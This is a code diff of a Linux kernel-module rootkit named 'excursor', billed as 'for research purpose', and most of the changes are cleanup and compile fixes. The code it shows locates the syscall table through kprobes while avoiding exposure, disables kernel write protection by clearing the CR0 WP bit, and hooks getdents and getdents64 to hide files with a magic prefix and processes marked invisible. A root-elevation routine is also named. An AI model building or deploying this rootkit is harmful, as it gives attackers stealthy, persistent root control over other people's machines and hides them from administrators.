@@ -1,12 +1,12 @@
 //LKM rootkit main file
 //common includes
 
-#include<linux/version.h>
-#include<linux/dirent.h>
-#include<linux/syscalls.h>
-#include<linux/module.h>
-#include<linux/slab.h>
-#include<linux/sched.h>
+#include <linux/sched.h>
+#include <linux/module.h>
+#include <linux/syscalls.h>
+#include <linux/dirent.h>
+#include <linux/slab.h>
+#include <linux/version.h> 
 
 //since we are going for backward compatibility so certain includes changes for different kernel versions
 /*
@@ -20,14 +20,9 @@ The linux/version.h file has a macro called KERNEL_VERSION which will let you ch
 #endif
 */
 
-#if LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,18)
-#include<linux/unistd.h>
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
+#include <asm/uaccess.h>
 #endif
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,26)
-#include<linux/proc_ns.h>
-#else
-#include<linux/proc_fs.h>
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
 #include <linux/proc_ns.h>
@@ -35,8 +30,14 @@ The linux/version.h file has a macro called KERNEL_VERSION which will let you ch
 #include <linux/proc_fs.h>
 #endif
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
-#include <asm/uaccess.h>
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
+#include <linux/file.h>
+#else
+#include <linux/fdtable.h>
+#endif
+
+#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
+#include <linux/unistd.h>
 #endif
 
 
@@ -48,7 +49,7 @@ The linux/version.h file has a macro called KERNEL_VERSION which will let you ch
 
 //we will now describe some symbols and variables for our functions later on, ofcourse we will do that accroding to kernel versions
 
-#if IS_ENABLED(CONFIG_X86)||IS_ENABLED(CONFIG_X86_64)
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 unsigned long cr0;
 #elif IS_ENABLED(CONFIG_ARM64)
 void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
@@ -75,14 +76,17 @@ static unsigned long *__sys_call_table;
 
 
 
+
 unsigned long * get_syscall_table_buffer(void){
 	unsigned long *syscall_table;
+
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
 #ifdef KPROBE_LOOKUP
 	//debugging stuff
-	/*KProbes is a debugging mechanism for the Linux kernel which can also be used for 		monitoring events inside a production system. You can use it to weed out performance 		bottlenecks, log specific events, trace problems etc. KProbes was developed by IBM as an 		underlying mechanism for another higher level tracing tool called DProbes*/
+	/*KProbes is a debugging mechanism for the Linux kernel which can also be used for monitoring events inside a production system. You can use it to weed out performance 
+	bottlenecks, log specific events, trace problems etc. KProbes was developed by IBM as an underlying mechanism for another higher level tracing tool called DProbes*/
 
-	//going to use kallsysm_lookup_name because we don't want our rootkit to get exposed by 	exporting system call table
+	//going to use kallsysm_lookup_name because we don't want our rootkit to get exposed by exporting system call table
 	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 	kallsyms_lookup_name_t kallsyms_lookup_name;
 	register_kprobe(&kp);
@@ -110,7 +114,7 @@ unsigned long * get_syscall_table_buffer(void){
 
 struct task_struct * find_task(pid_t pid){
 	struct task_struct *p = current;
-	//The task_struct structure defined in sched.h stores all the details of every process 		that exists in the system, and all the processes in turn are stored in a circular double 		linked list.
+	//The task_struct structure defined in sched.h stores all the details of every process that exists in the system, and all the processes in turn are stored in a circular double 		linked list.
 
 	//https://tuxthink.blogspot.com/2011/03/using-foreachprocess-in-proc-entry.html
 	for_each_process(p){
@@ -121,7 +125,7 @@ struct task_struct * find_task(pid_t pid){
 	return NULL;
 }
 
-int invisible(pid_t pid){
+int is_invisible(pid_t pid){
 
 	//look whether the PID holds the PF_INVISIBLE flag
 	struct task_struct *task;
@@ -135,7 +139,7 @@ int invisible(pid_t pid){
 	return 0;
 }
 
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4,16,0)
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 static asmlinkage long owari_getdents64(const struct pt_regs *pt_regs) {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 	int fd = (int) pt_regs->di;
@@ -146,9 +150,10 @@ static asmlinkage long owari_getdents64(const struct pt_regs *pt_regs) {
 #endif
 	int ret = orig_getdents64(pt_regs), err;
 #else
-
-asmlinkage int owari_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
-		int ret = orig_getdents64(fd, dirent, count), err;
+asmlinkage int owari_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
+	unsigned int count)
+{
+	int ret = orig_getdents64(fd, dirent, count), err;
 #endif
 	unsigned short proc = 0;
 	unsigned long off = 0;
@@ -166,6 +171,7 @@ asmlinkage int owari_getdents64(unsigned int fd, struct linux_dirent64 __user *d
 	if (err)
 		goto out;
 
+
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
 #else
@@ -178,7 +184,8 @@ asmlinkage int owari_getdents64(unsigned int fd, struct linux_dirent64 __user *d
 	while (off < ret) {
 		dir = (void *)kdirent + off;
 		if ((!proc &&
-		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))||(proc &&
+		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
+		|| (proc &&
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
@@ -198,7 +205,7 @@ out:
 	return ret;
 }
 
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4,16,0)
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 static asmlinkage long owari_getdents(const struct pt_regs *pt_regs) {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 	int fd = (int) pt_regs->di;
@@ -209,8 +216,7 @@ static asmlinkage long owari_getdents(const struct pt_regs *pt_regs) {
 #endif
 	int ret = orig_getdents(pt_regs), err;
 #else
-asmlinkage int owari_getdents(unsigned int fd, struct linux_dirent __user *dirent,
-	unsigned int count)
+asmlinkage int owari_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)
 {
 	int ret = orig_getdents(fd, dirent, count), err;
 #endif
@@ -230,7 +236,7 @@ asmlinkage int owari_getdents(unsigned int fd, struct linux_dirent __user *diren
 	if (err)
 		goto out;
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3,19,0)
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
 #else
 	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
@@ -263,7 +269,6 @@ out:
 	kfree(kdirent);
 	return ret;
 }
-
 void
 elevate_root(void)
 {
@@ -355,30 +360,28 @@ __force_order is used to force instruction serialization.
 */
 //This changes the WP bit of cr0 register to 1, enabling syscall table overwrite.
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4,16,0)
-static inline void
-write_cr0_forced(unsigned long val){
+static inline void write_cr0_forced(unsigned long val){
 	unsigned long __force_order;
 	asm volatile(
 		"mov %0, %%cr0":"+r"(val), "+m"(__force_order));
 }
 #endif
 
-static inline void
-protect_memory(void){
+static inline void protect_memory(void){
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4,16,0)
 	write_cr0_forced(cr0);
 #else
-	//so if the kernel version is less than 4.16.0 we don't need to force, can just simply 		change the parameter (described in the excursor.h	
+	//so if the kernel version is less than 4.16.0 we don't need to force, can just simply change the parameter (described in the excursor.h	
 	write_cr0(cr0);
 #endif
 #elif IS_ENABLED(CONFIG_ARM64)
-	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, 		PAGE_KERNEL_RO);
+	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL_RO);
 #endif
 }
 
 //undo everything that we have done, overwrite cr0 WP flag now with 0
-unprotect_memory(void){
+static inline void unprotect_memory(void){
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	write_cr0_forced(cr0 & ~0x00010000);
@@ -386,7 +389,7 @@ unprotect_memory(void){
 	write_cr0(cr0 & ~0x00010000);
 #endif
 #elif IS_ENABLED(CONFIG_ARM64)
-	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,section_size, 		PAGE_KERNEL);
+	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,section_size, PAGE_KERNEL);
 #endif
 }
 
@@ -395,8 +398,8 @@ static int __init
 //init module for the rootkit
 excursor_init(void)
 {
-	//get_syscall_table_bf is our own version of syscall_table, we're overwriting this into 	the original one
-	__sys_call_table = get_syscall_table_bf();
+	//get_syscall_table_buffer is our own version of syscall_table, we're overwriting this into the original one
+	__sys_call_table = get_syscall_table_buffer();
 	if (!__sys_call_table)
 		return -1;
 
@@ -415,7 +418,7 @@ excursor_init(void)
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	
-	//this is the hooking part, we are overwrting the directory entry (getdents with our fake 		system call, in our case kill system
+	//this is the hooking part, we are overwrting the directory entry (getdents with our fake system call, in our case kill system
 	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
 	//this line puts the orig_getdents on our variable, we will swap this with our own one.
 	//getdents is here for our file and directory hiding feature
@@ -444,7 +447,7 @@ excursor_init(void)
 	return 0;
 }
 
-excursor_cleanup(void)
+static void __exit excursor_cleanup(void)
 {
 	//This is the cleanup module, meaning we will undo everything that we have done on 		init.		
 	unprotect_memory();
@@ -461,9 +464,9 @@ excursor_cleanup(void)
 module_init(excursor_init);
 module_exit(excursor_cleanup);
 
-MODULE_LICENSE("MIT LICENSE");
+MODULE_LICENSE("Dual BSD/GPL");
 MODULE_AUTHOR("Sakai01");
 MODULE_DESCRIPTION("Linux Kernel Module Rootkit for research purpose!!");
-MODULE_VERSION("1.0")
+MODULE_VERSION("1.0");
 
 //ok finally it end...
